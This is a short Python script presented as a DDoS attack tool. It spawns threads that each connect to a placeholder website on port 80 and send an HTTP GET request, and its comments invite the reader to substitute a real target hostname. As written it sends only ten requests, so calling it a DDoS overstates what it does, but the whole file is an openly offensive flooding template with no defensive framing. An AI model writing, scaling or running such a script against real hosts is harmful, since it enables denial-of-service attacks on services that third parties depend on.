import socket
import threading

def ddos_attack(target_host, target_port):
    """Perform a DDoS attack on a target host and port."""
    try:
        # Create socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to target
        client_socket.connect((target_host, target_port))
        
        # Send data
        client_socket.send("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_host).encode())
        
        # Close socket
        client_socket.close()
        
        print(f"Sent DDoS attack to {target_host}:{target_port}")
    except Exception as e:
        print(f"Error performing DDoS attack: {e}")

if __name__ == "__main__":
    target_host = "targetwebsite.com"  # Replace with the target website hostname or IP address
    target_port = 80  # Replace with the target port number
    for _ in range(10):  # Send 10 DDoS attack requests
        threading.Thread(target=ddos_attack, args=(target_host, target_port)).start()
